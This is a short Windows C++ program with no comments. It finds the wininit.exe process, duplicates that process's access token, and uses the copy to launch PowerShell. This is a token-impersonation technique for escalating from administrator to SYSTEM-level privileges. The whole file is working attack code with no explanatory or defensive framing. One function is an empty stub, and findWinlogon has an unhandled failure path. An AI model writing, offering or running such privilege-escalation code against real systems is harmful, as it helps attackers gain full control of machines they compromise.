#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>

#pragma comment (lib,"advapi32.lib")

DWORD findWinlogon()
{

	DWORD logonPID = 0;
	HANDLE logonHandle = NULL;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"wininit.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			logonPID = processEntry.th32ProcessID;
		}
		return logonPID;
	}
}

VOID CreateImpersonatedProcess(HANDLE NewToken)
{
	bool NewProcess;

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);

	NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

	
	CloseHandle(NewToken);
}

VOID ObtainToken(int TargetPID)
{
	HANDLE hProcess = NULL;
	HANDLE TokenHandle = NULL;
	HANDLE NewToken = NULL;
	BOOL OpenToken;
	BOOL Duplicate;

	hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetPID);

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE, &TokenHandle);
	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &NewToken);


	CreateImpersonatedProcess(NewToken);
}

VOID CheckCurrentProcess()
{
	HANDLE TokenHandle = NULL;
	HANDLE hCurrent = GetCurrentProcess();
	OpenProcessToken(hCurrent, TOKEN_QUERY, &TokenHandle);

	

}

int main()
{
	CheckCurrentProcess();
	int winLogonPID = findWinlogon();
	ObtainToken(winLogonPID);
	return 0;
}
